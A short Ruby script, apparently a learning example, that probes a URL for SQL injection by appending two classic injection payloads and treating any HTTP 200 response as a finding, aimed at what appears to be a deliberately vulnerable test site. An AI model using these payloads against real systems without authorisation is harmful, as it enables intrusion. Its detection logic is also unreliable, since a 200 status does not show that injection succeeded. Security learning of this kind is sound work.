require 'http'

def scan(url)
  # These are common SQL injection payloads
  payloads = ["' OR 1=1; --", "' OR '1'='1"]

  payloads.each do |payload|
    response = HTTP.get(url + payload)
    if response.code == 200
      puts " [*] Possible SQL Injection Vulnerability Found At #{url}"
      break
    end
  end
end

# Test the scanner with a vulnerable URL
scan("http://testphp.vulnweb.com/artists.php?artist=1")
